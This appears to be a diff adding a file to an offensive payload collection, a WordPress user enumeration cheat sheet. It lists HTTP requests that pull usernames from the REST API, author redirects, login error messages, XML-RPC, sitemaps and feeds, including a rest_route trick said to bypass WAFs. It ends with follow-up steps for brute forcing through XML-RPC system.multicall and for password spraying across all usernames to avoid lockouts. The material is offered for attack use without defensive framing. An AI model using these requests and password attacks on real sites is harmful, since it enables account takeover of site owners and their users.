@@ -1,0 +1,101 @@
+# WordPress User Enumeration Payloads
+
+Gives you usernames → half the battle for brute force is knowing the username.
+
+## 1. REST API user enumeration (the classic, still works)
+```
+GET /wp-json/wp/v2/users
+GET /wp-json/wp/v2/users?per_page=100
+GET /wp-json/wp/v2/users?after=2021-01-01&before=2022-01-01
+GET /wp-json/wp/v2/users?search=admin
+GET /?rest_route=/wp/v2/users
+```
+
+If blocked, try by user ID (also works over CDN often):
+```
+GET /wp-json/wp/v2/users/1
+GET /wp-json/wp/v2/users/2
+...
+```
+
+## 2. Author enumeration via ?author=
+```
+GET /?author=1
+GET /?author=2
+GET /?author=3
+```
+Check for a 301 redirect to `/author/admin/` — that leaks the username.
+
+```
+GET /author/admin/
+GET /author/administrator/
+```
+
+## 3. Login error messages
+```
+POST /wp-login.php
+Content-Type: application/x-www-form-urlencoded
+
+log=admin&pwd=wrongpass&wp-submit=Log+In
+
+# "Unknown username"    -> user does NOT exist
+# "The password entered" -> user EXISTS !!
+```
+
+## 4. XML-RPC (if enabled — test FIRST)
+```
+POST /xmlrpc.php
+
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params><param><value>admin</value></param><param><value>badpass</value></param></params>
+</methodCall>
+```
+Response code `403` (incorrect user/pass) = user EXISTS.
+Use `wp.getUsersBlogs` per username to enumerate users in bulk.
+
+## 5. Comment author leak
+```
+GET /?p=1
+# Look at comment author links: /author/admin/
+```
+
+## 6. Sitemap / RSS leak
+```
+GET /wp-sitemap.xml
+GET /wp-sitemap-users-1.xml
+GET /sitemap.xml
+GET /feed/
+GET /feed/atom/
+# /feed/ often exposes users on multi-author blogs
+```
+
+## 7. Newer REST routes that leak data
+```
+GET /wp-json/wp/v2/users/me
+GET /wp-json/wp/v2/comments
+GET /wp-json/wp/v2/media
+GET /wp-json/wp/v2/posts
+GET /wp-json/wp/v2/types
+GET /wp-json/
+GET /wp-json/wp/v2/categories
+GET /wp-json/wp/v2/tags
+```
+
+## 8. User enum via ?rest_route (bypasses several WAFs)
+```
+GET /index.php?rest_route=/wp/v2/users
+GET /index.php?rest_route=/wp/v2/users/1
+```
+
+## 9. Author pages without login requirement
+```
+GET /wp-json/wp/v2/users?orderby=registered&order=asc
+```
+
+---
+
+## What to do with usernames
+1. Confirm password policy → try top 20 passwords on each user (see `Credentials/` folder).
+2. If `xmlrpc.php` is enabled, brute force via `system.multicall` (see `wp-xmlrpc-attacks.txt`) — ~1000 attempts per request.
+3. Spray: one password (`Summer2026!`, `Password123`) across ALL usernames — catches credential re-use without lockouts.
